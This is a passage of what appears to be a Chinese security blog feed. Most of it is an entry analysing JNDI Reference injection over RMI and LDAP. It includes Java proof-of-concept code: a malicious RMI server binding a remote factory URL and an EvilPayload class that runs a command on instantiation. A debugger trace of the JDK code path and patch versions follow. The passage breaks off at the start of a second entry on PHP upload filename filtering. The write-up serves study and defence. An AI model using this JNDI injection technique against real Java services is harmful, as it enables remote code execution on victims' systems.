URI 为用户可控；</li><li>2.攻击者控制 URI 参数为恶意的 RMI 服务地址，如：rmi:&#x2F;&#x2F;hacker_rmi_server&#x2F;&#x2F;name；</li><li>3.攻击者 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定某个精心构造的 Factory 类；</li><li>4.目标在进行 lookup()操作时，会动态加载并实例化 Factory 类，接着调用 factory.getObjectInstance()获取外部远程对象实例；</li><li>5.攻击者可以在 Factory 类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到 RCE 的效果；</li></ul><p>简述就是可以通过References引用远程用户自定义地址的factory工厂执行恶意代码。</p><p>实现:<br>JNDIServer端（通过References绑定远程地址和工厂）：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        ic.rebind(&quot;rmi://localhost:1099/RMIObject&quot;,new RMIObjectImpl());</span></span><br><span class="line">        Reference rf=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;EvilPayload&quot;</span>,<span class="string">&quot;http://localhost:8999/&quot;</span>);</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,rf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>恶意远程地址：<br><img src="/posts/ad3be040/r-143.png" title="恶意远程地址"></p><p>恶意类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilPayload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端执行:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/ad3be040/r-144.png" title="客户端执行"></p><h3 id="3、References-ldap注入-核心"><a href="#3、References-ldap注入-核心" class="headerlink" title="3、References-ldap注入(核心)"></a>3、References-ldap注入(核心)</h3><p>利用流程很简单：通过客户端lookup查询远程ldap服务恶意类触发漏洞。</p><p>恶意地址类:</p><p><img src="/posts/ad3be040/r-188.png" title="恶意地址类"></p><p>客户端启动ldap服务，将恶意地址类进行绑定：</p><p><img src="/posts/ad3be040/r-187.png" title="LDAP服务"></p><p>客户端进行查询ldap服务，触发漏洞：</p><p><img src="/posts/ad3be040/r-189.png" title="lookup查询"></p><h2 id="三、源码分析"><a href="#三、源码分析" class="headerlink" title="三、源码分析"></a>三、源码分析</h2><h3 id="1、jndi-rmi原生调用分析"><a href="#1、jndi-rmi原生调用分析" class="headerlink" title="1、jndi-rmi原生调用分析"></a>1、jndi-rmi原生调用分析</h3><p>这里其实流程不多的，前面提到了该调用方式，顺带学习下流程分析<br>JNDI-RMI服务端:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">    InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,<span class="keyword">new</span> <span class="title class_">RMIObjectImpl</span>());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>JNDI-RMI客户端调用：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">        System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在调用<code>lookup</code>处下断点</p><p><img src="/posts/ad3be040/r-149.png" title="lookup方法"></p><p>跟进<code>InitialContext.lookup</code>方法</p><p><img src="/posts/ad3be040/r-150.png" title="lookup方法"></p><p>通过<code>getURLOrDefaultInitCtx</code>方法获取字符串上下文，传递的为rmi路径字符串，判断字符串协议，获取到<code>rmiURLContext</code>上下文表（实际是一个<code>hashtable</code>）</p><p><img src="/posts/ad3be040/r-151.png" title="rmiURLContext"></p><p>返回<code>rmiURLContext</code>上下文表后调用，<code>rmiURLContext.lookup</code>方法，实际调用<code>rmiURLContext</code>父类<code>GenericURLContext</code>的<code>lookup</code>方法，继续跟进<code>GenericURLContext.lookup</code>方法</p><p>通过<code>getRootURLContext</code>方法对<code>name</code>字符串进行分割读取</p><p><img src="/posts/ad3be040/r-152.png" title="rmiURLContext"></p><p>分割完后通过<code>RegistryContext</code>方法获取注册信息</p><p><img src="/posts/ad3be040/r-153.png" title="RegistryContext"></p><p>通过<code>getRegistry</code>方法获取到<code>RegistryImpl_Stub</code>的注册信息</p><p><img src="/posts/ad3be040/r-154.png" title="getRegistry"></p><p>调用注册中心获取注册中心<code>stub</code></p><p><img src="/posts/ad3be040/r-155.png" title="getRegistry"></p><p>获取到过后回到主体，通过<code>ResolveResult</code>方法解析结果</p><p><img src="/posts/ad3be040/r-156.png" title="ResolveResult"></p><p>实际就是将注册内容赋值给解析结果</p><p><img src="/posts/ad3be040/r-157.png" title="ResolveResult"></p><p>获取到解析结果<code>res</code>,再调用<code>getResolvedObj</code>方法获取到解析结果对象（也就是<code>RegistryContext</code>）</p><p><img src="/posts/ad3be040/r-158.png" title="res"></p><p>再调用<code>RegistryContext.lookup</code>方法</p><p><img src="/posts/ad3be040/r-159.png" title="RegistryContext.lookup"></p><p>这里就是调用原生rmi的步骤了</p><p><img src="/posts/ad3be040/r-160.png" title="RegistryImpl_stub"></p><p>调用<code>RegistryImpl_stub.lookup</code>方法，流程跟上面分析过的<code>rmi</code>的步骤一样通过<code>lookup</code>向注册中心查询远程对象，就不再分析了</p><p><img src="/posts/ad3be040/r-161.png" title="RegistryImpl_stub"></p><p>返回了一个远程服务器的动态代理对象<code>stub</code></p><p><img src="/posts/ad3be040/r-163.png" title="stub"></p><p>然后调用<code>decodeObject</code>方法</p><p><img src="/posts/ad3be040/r-164.png" title="decodeObject"></p><p><code>decodeObject</code>方法最先判断该远程对象（<code>RemoteObjectlnvocationHandler</code>）是否属于<code>RemoteReference</code>远程引用类，由于不属于就将该对象转化为<code>Object</code>对象</p><p><img src="/posts/ad3be040/r-165.png" title="decodeObject"></p><p>然后调用<code>NamingManager.getObjectInstance</code>方法，继续跟进，这里用注释解释一些步骤</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object</span><br><span class="line">      <span class="title function_">getObjectInstance</span><span class="params">(Object refInfo, Name name, Context nameCtx,</span></span><br><span class="line"><span class="params">                        Hashtable&lt;?,?&gt; environment)</span></span><br><span class="line">      <span class="keyword">throws</span> Exception</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">      ObjectFactory factory;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//使用工厂，若工厂变量存在被赋值，就用赋值的工厂去构建对象，默认为null</span></span><br><span class="line">      <span class="comment">// Use builder if installed</span></span><br><span class="line">      <span class="type">ObjectFactoryBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> getObjectFactoryBuilder();</span><br><span class="line">      <span class="keyword">if</span> (builder != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">// builder must return non-null factory</span></span><br><span class="line">          factory = builder.createObjectFactory(refInfo, environment);</span><br><span class="line">          <span class="keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,</span><br><span class="line">              environment);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//判断对象是否实现Reference或者Referenceable</span></span><br><span class="line">      <span class="comment">// Use reference if possible</span></span><br><span class="line">      <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">          ref = (Reference) refInfo;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (refInfo <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">          ref = ((Referenceable)(refInfo)).getReference();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      Object answer;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//工厂存在、并且对象是Reference类，工厂类名能获取到，就对该对象进行工厂构建实例化对象</span></span><br><span class="line">      <span class="keyword">if</span> (ref != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">f</span> <span class="operator">=</span> ref.getFactoryClassName();</span><br><span class="line">          <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</span><br><span class="line">              <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line">              factory = getObjectFactoryFromReference(ref, f);</span><br><span class="line">              <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                   environment);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// No factory found, so return original refInfo.</span></span><br><span class="line">              <span class="comment">// Will reach this point if factory class is not in</span></span><br><span class="line">              <span class="comment">// class path and reference does not contain a URL for it</span></span><br><span class="line">              <span class="keyword">return</span> refInfo;</span><br><span class="line"></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">// if reference has no factory, check for addresses</span></span><br><span class="line">              <span class="comment">// containing URLs</span></span><br><span class="line"></span><br><span class="line">              answer = processURLAddrs(ref, name, nameCtx, environment);</span><br><span class="line">              <span class="keyword">if</span> (answer != <span class="literal">null</span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> answer;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//上面的情况都不存在，没有工厂，对象也不是Reference类，就搜寻其它符合条件的的工厂，存在就返回工厂，否则返回null</span></span><br><span class="line">      <span class="comment">// try using any specified factories</span></span><br><span class="line">      answer =</span><br><span class="line">          createObjectFromFactories(refInfo, name, nameCtx, environment);</span><br><span class="line">      <span class="keyword">return</span> (answer != <span class="literal">null</span>) ? answer : refInfo;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在该方法中，由于构建器未创建因此<code>builder</code>为<code>null</code>，同时该动态代理<code>stub</code>不属于<code>Reference/Referenceable</code>，因此找不到对应的工厂无法进行创建对象实例化，最后调用<code>createObjectFromFactories</code>方法寻找符合条件的工厂，不存在符合条件的工厂，因此返回<code>null</code>，到此结束创建过程，最后只获得<code>rmi</code>的远程服务<code>stub</code>进行通讯</p><p><img src="/posts/ad3be040/r-166.png" title="NamingManager.getObjectInstance"></p><p>总结描述就是：JNDI通过上下文对rmi字符串进行解析，识别到rmi协议，判断是否是远程引用（References类），不是的话再由rmi调用方式去执行代码。</p><h3 id="2、References-rmi注入调试分析"><a href="#2、References-rmi注入调试分析" class="headerlink" title="2、References-rmi注入调试分析"></a>2、References-rmi注入调试分析</h3><p>JNDI-rmi服务端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] agrs)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException,Exception &#123;</span><br><span class="line">        InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="comment">//        ic.rebind(&quot;rmi://localhost:1099/RMIObject&quot;,new RMIObjectImpl());</span></span><br><span class="line">        Reference rf=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;2EvilPayload&quot;</span>,<span class="string">&quot;EvilPayload&quot;</span>,<span class="string">&quot;http://localhost:8999/&quot;</span>);</span><br><span class="line">        ic.rebind(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>,rf);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>JNDI-rmi客户端：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException,Exception &#123;</span><br><span class="line">    InitialContext ic=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">    RMIObject rl=(RMIObject) ic.lookup(<span class="string">&quot;rmi://localhost:1099/RMIObject&quot;</span>);</span><br><span class="line">    System.out.println(rl.hello(<span class="string">&quot;hi&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1）环境准备</strong><br>当前测试环境为jdk1.8.0_66(漏洞在jdk8_121处进行防护措施),在调试前需要添加sun包，idea导入默认的jdk1.8.0_66版本没有sun.jndi的包，调试中会遇到jndi包会进入class文件，不利于调试，因此需要手动导入sun.jndi包</p><p>源码下载：<a href="https://hg.openjdk.java.net/jdk8/jdk8/jdk/">https://hg.openjdk.java.net/jdk8/jdk8/jdk/</a></p><p><img src="/posts/ad3be040/r-145.png" title="sun源码下载"></p><p>下载过后，将对应sun.jndi包导入jdk根目录src.zip中，然后重新加载一下即可</p><p><img src="/posts/ad3be040/r-146.png" title="sun源码导入"><br><img src="/posts/ad3be040/r-147.png" title="sun源码导入"></p><p>接下来就能对当前java版本进行调试了</p><p><img src="/posts/ad3be040/r-148.png" title="调试"></p><p><strong>2）分析调试</strong><br>前半段部分跟原生rmi分析一样，不重复分析，进入到不同的代码逻辑中分析，直到<code>RegistryContext.lookup</code>方法这里获取obj对象。</p><p><img src="/posts/ad3be040/r-168.png" title="DecodeObject"></p><p>通过<code>RegistryImpl_Stub.lookup</code>查询对象，本身返回的是远程对象的<code>stub</code>如上面分析那样获取远程对象的动态代理<code>stub</code>，但这里返回<code>ReferenceWrapper_Stub</code></p><p><img src="/posts/ad3be040/r-169.png" title="RegistryImpl_Stub.lookup"></p><p>导致返回<code>ReferenceWrapper_Stub</code>的原因在服务端进行<code>rebind</code>的时候进行的<code>encodeObject</code></p><p><img src="/posts/ad3be040/r-170.png" title="rebind"></p><p>跟进绑定，这里直接截取关键步骤到<code>RegistryContext.rebind</code>方法，这里在对对象绑定时，多了一个<code>encodeObject</code>步骤</p><p><img src="/posts/ad3be040/r-171.png" title="rebind"></p><p>这里针对<code>obj</code>对象属于<code>Reference</code>类的话，就强制转换成<code>ReferenceWrapper</code>对象，因此实际绑定的是<code>ReferenceWrapper_stub</code>对象，在上面远程获取对象<code>stub</code>的时候会获取到<code>ReferenceWrapper_stub</code></p><p><img src="/posts/ad3be040/r-172.png" title="lookup"></p><p>回到客户端主体上来，获取到<code>ReferenceWrapper_stub</code>对象过后，运行<code>decodeObject</code>方法</p><p><img src="/posts/ad3be040/r-173.png" title="encodeObject"></p><p>跟进<code>decodeObject</code>方法，此时判断远程对象属于是<code>RemoteReference</code>类，因此调用<code>getReference()</code>方法返回引用对象</p><p><img src="/posts/ad3be040/r-167.png" title="DecodeObject"></p><p>然后调用<code>NamingManager.getObjectInstance</code>方法，继续跟进</p><p><img src="/posts/ad3be040/r-174.png" title="NamingManager.getObjectInstance"></p><p>这里同样显示查看是否存在构造器，由于未创建，因此<code>builder</code>为<code>null</code>，再判断远程对象是否属于引用类（<code>Reference</code>），属于，然后将引用对象信息赋值给<code>ref</code>变量</p><p><img src="/posts/ad3be040/r-175.png" title="NamingManager.getObjectInstance"></p><p>接着<code>ref</code>已经被赋值，因此进入判断体，变量<code>f</code>为获取远程对象的工厂类名，<code>ref</code>存在、<code>f</code>存在，通过<code>getObjectFactoryFromReference</code>方法从引用中获取对象工厂，跟进<code>getObjectFactoryFromReference</code>方法</p><p><img src="/posts/ad3be040/r-176.png" title="getObjectFactoryFromReference"></p><p><code>getObjectFactoryFromReference</code>方法通过类加载直接加载工厂名</p><p><img src="/posts/ad3be040/r-177.png" title="loadClass"></p><p>通过本地类加载器去加载工厂类</p><p><img src="/posts/ad3be040/r-178.png" title="loadClass"></p><p>由于是远程地址的工厂，本地加载器查询不到的远程的工厂，因此<code>cla</code>为<code>null</code></p><p><img src="/posts/ad3be040/r-179.png" title="loadClass"></p><p>接着调用<code>ref.getFactoryClassLocation()</code>查看工厂类地址，返回远程地址</p><p><img src="/posts/ad3be040/r-180.png" title="getFactoryClassLocation()"></p><p>然后再调用类加载去加载<code>codebase</code>远程地址</p><p><img src="/posts/ad3be040/r-181.png" title="getFactoryClassLocation()"></p><p>这里通过调用<code>URLClassLoader</code>类加载器去创建出<code>FactoryURLClassLoader</code>工厂<code>URL</code>类加载器，然后通过这个工厂<code>URL</code>类加载器去远程加载恶意工厂</p><p><img src="/posts/ad3be040/r-182.png" title="FactoryURLClassLoader"></p><p><img src="/posts/ad3be040/r-185.png" title="远程地址"></p><p>获取到加载器后，就调用加载器实例化<code>newInstance()</code>，此时恶意工厂的构造函数被执行，触发漏洞</p><p><img src="/posts/ad3be040/r-183.png" title="newInstance()"></p><p><img src="/posts/ad3be040/r-184.png" title="漏洞触发"></p><p><strong>调用链</strong><br>由上面分析步骤得到JNDI-rmi的Reference注入调用链：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RegistryContext.DecodeObject()</span><br><span class="line">    -&gt;NamingManager.getObjectInstance()</span><br><span class="line">        -&gt;factory.getObjectInstance()</span><br></pre></td></tr></table></figure><p><strong>3）疑惑</strong><br>在运行一次引用注入过后，每一步调试不再去请求远程地址，通过本地的类加载器也能加载工厂进行实例化。</p><p>原因：在构造过后本地项目out目录下生成了远程工厂的类，因此在下次执行的时候在本地类加载的时候就能获取到该类信息。（具体在哪个步骤导致的没发现，本地文件删除过后，后面就没写入了）</p><h3 id="3、References-ldap注入调试分析"><a href="#3、References-ldap注入调试分析" class="headerlink" title="3、References-ldap注入调试分析"></a>3、References-ldap注入调试分析</h3><p>lookup下断点分析</p><p><img src="/posts/ad3be040/r-191.png" title="lookup"></p><p>同样的步骤通过<code>getURLOrDefaultInitCtx</code>方法获取字符串上下文，判断协议前缀调用对象类的上下文，前面分析过了，这里直接过掉</p><p><img src="/posts/ad3be040/r-192.png" title="getURLOrDefaultInitCtx"></p><p>通过协议前缀获取到<code>ldapURLContext</code>上下文，进入它的<code>lookup</code>方法</p><p><img src="/posts/ad3be040/r-193.png" title="ldapURLContext"></p><p>通过<code>hasQueryComponents</code>方法查询字符串结尾是否存在?号（如ldap:&#x2F;&#x2F;localhost:9999&#x2F;?），存在就抛出异常，接着跟进<code>super.lookup</code>方法，也就是父类的<code>lookup</code>方法</p><p>同样调用<code>getRootURLContext</code>方法分割解析路径获取解析结果，在调用<code>getResolvedObj</code>方法获取解析结果对象<code>LdapCtx</code></p><p><img src="/posts/ad3be040/r-194.png" title="GenericURLContext.lookup"></p><p>跟进<code>ctx.lookup</code></p><p><img src="/posts/ad3be040/r-194.png" title="ctx.lookup"></p><p>获取一些相关属性过后，调用<code>LdapCtx.lookup</code>方法（调用到父类<code>ComponentDirContext</code>的<code>.lookup</code>方法），继续跟进</p><p><img src="/posts/ad3be040/r-195.png" title="ComponentDirContext.lookup"></p><p>通过<code>p_resolveIntermediate</code>方法解析运行介质，进入<code>TERMINAL_COMPONENT</code>终端组件分支（我是这么理解的），然后调用<code>c_lookup</code>方法，跟进</p><p><img src="/posts/ad3be040/r-196.png" title="LdapCtx.c_lookup"></p><p>获取到远程<code>ldap</code>的<code>entry</code>后赋值给<code>attr</code>保存，开始解码对象信息</p><p><img src="/posts/ad3be040/r-197.png" title="decodeObject"></p><p>先是获取到<code>codebase</code>也就是<code>ldap</code>服务地址，然后判断字段属性，根据不同属性进行不同的解析（如果是序列化对象就用反序列化解析对象，如果是远程对象，就用rmi解析对象），</p><p><img src="/posts/ad3be040/r-198.png" title="JAVA_ATTRIBUTES"></p><p>这里是引用对象，因此会走到引用对象判断里，调用<code>decodeReference</code>方法</p><p><img src="/posts/ad3be040/r-199.png" title="引用对象"></p><p>跟进<code>decodeReference</code>方法，获取类名、工厂，然后创建引用对象信息<code>ref</code></p><p><img src="/posts/ad3be040/r-200.png" title="引用对象ref"></p><p>获取到<code>ref</code>引用对象<code>Obj</code>后，调用<code>DirectoryManager.getObjectInstance</code>静态方法，跟进</p><p><img src="/posts/ad3be040/r-201.png" title="DirectoryManager.getObjectInstance"><br><img src="/posts/ad3be040/r-202.png" title="DirectoryManager.getObjectInstance"></p><p>可以看到这里的方法跟上面<code>jndi-rmi</code>最后调用实例化的方法<code>NamingManager.getObjectInstance</code>非常相似，相关判断描述在<code>jndi-rmi</code>分析过了就接着下面</p><p>获取到工厂对象信息、工厂类名后，然后通过<code>getObjectFactoryFromReference</code>构建工厂</p><p><img src="/posts/ad3be040/r-203.png" title="getObjectFactoryFromReference"></p><p>跟进，类加载工厂类名</p><p><img src="/posts/ad3be040/r-204.png" title="loadClass"></p><p>同样本地不存在该工厂类（该类为ldap远程的恶意类，本地加载器在本地搜索不到该类），传入<code>codebase</code>进行类加载，继续跟进</p><p><img src="/posts/ad3be040/r-205.png" title="loadClass"></p><p>同样的步骤通过<code>URLClassLoader</code> URL加载器远程加载对象类</p><p><img src="/posts/ad3be040/r-206.png" title="URLClassLoader.newInstance"></p><p>获取URLClassLoader类加载器后，再次进行类加载</p><p><img src="/posts/ad3be040/r-207.png" title="loadClass"></p><p>此时通过反射成功获取到远程类对象。</p><p><img src="/posts/ad3be040/r-208.png" title="loadClass"></p><p>然后返回类对象，最后对类对象进行实例化，触发漏洞，最后的步骤跟jndi调用rmi时步骤一样</p><p><img src="/posts/ad3be040/r-209.png" title="newInstance"><br><img src="/posts/ad3be040/r-210.png" title="触发漏洞"></p><h1 id="0x04、修复范围"><a href="#0x04、修复范围" class="headerlink" title="0x04、修复范围"></a>0x04、修复范围</h1><p>JNDI-RMI:<br><font color="red">JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121</font>开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。<br><font color="red">JDK 6u132, JDK 7u122, JDK 8u113</font>开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p><p>JNDI-LDAP:<br>2018年10月，Java修复了该利用点，对LDAP Reference远程工厂类的加载增加了限制<br>范围：<font color="red">Oracle JDK 11.0.1、8u191、7u201、6u211</font>之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，需要人工调整至true</p><p>引用网上的一张修复时间轴:</p><p><img src="/posts/ad3be040/r-190.png" title="漏洞修复时间轴"></p><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>可以看到LDAP的利用限制仅限制于服务器JAVA版本，没有其他限制，而RMI除了java版本限制以外，还存在利用链依赖组件条件满足才能去触发漏洞。</p><p>总的来说rmi和ldap的利用情况和源码层面很类似，Jndi根据不同协议进入不同的上下文处理，但在漏洞版本内都到最后进行远程调用恶意类实例化对象触发漏洞。</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a><br><a href="https://www.bilibili.com/video/BV1L3411a7ax/">https://www.bilibili.com/video/BV1L3411a7ax/</a><br><a href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a><br><a href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a href="https://blog.csdn.net/qq_35029061/article/details/126160669">https://blog.csdn.net/qq_35029061/article/details/126160669</a><br><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie">https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie</a><br><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php7内核rfc1867协议对文件上传的过滤浅析</title>
      <link href="/posts/9fa41563.html"/>
      <url>/posts/9fa41563.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>在对php7环境下的普通文件上传，自动过滤了特殊符号，通过<code>$_files[file][name]</code>获取到文件名引发的思考。</p><h1 id="0x01、背景"><a href="#0x01、背景" class="headerlink" title="0x01、背景"></a>0x01、背景</h1><p>测试环境：<br>php：7.3.4</p><p>简单的文件上传源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;post&quot;</span></span><br><span class="line">      enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;file&quot;</span>&gt;Filename:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> id=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> id=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;Submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="variable">$_POST</span>[<span class="string">&quot;str&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Size: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="comment">//echo phpinfo();</span></span><br><span class="line">    <span class="comment">//move uploaded file($file[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $file[&#x27;file&#x27;][&#x27;name&#x27;]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件上传过程中，<code>$_files[file][name]</code>获取到&#x2F;或者\后的文件名，前面的符号被自动过滤<br><img src="/posts/9fa41563/php-1.png" title="文件上传"></p><p>换了不同的web应用，都是同样的情况，猜测php内核对文件上传的信息做了处理</p><h1 id="0x02、rfc1867协议"><a href="#0x02、rfc1867协议" class="headerlink" title="0x02、rfc1867协议"></a>0x02、rfc1867协议</h1><blockquote><p>RCF1867是Form-based File Upload in 